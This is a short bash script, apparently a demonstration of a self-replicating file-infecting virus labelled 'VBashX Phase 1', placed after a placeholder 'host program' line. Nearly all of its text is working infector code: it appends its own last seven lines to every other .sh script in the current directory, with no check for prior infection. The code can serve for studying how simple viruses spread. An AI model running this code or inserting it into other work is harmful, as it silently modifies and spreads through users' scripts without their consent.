#!/bin/bash
echo "I am the host program"
# --- VBashX Phase 1 ---
VIRUS_SIZE=7
for f in *.sh; do
    if [ "$(basename "$f")" != "$(basename "$0")" ]; then
        tail -n $VIRUS_SIZE "$0" >> "$f"
    fi
done
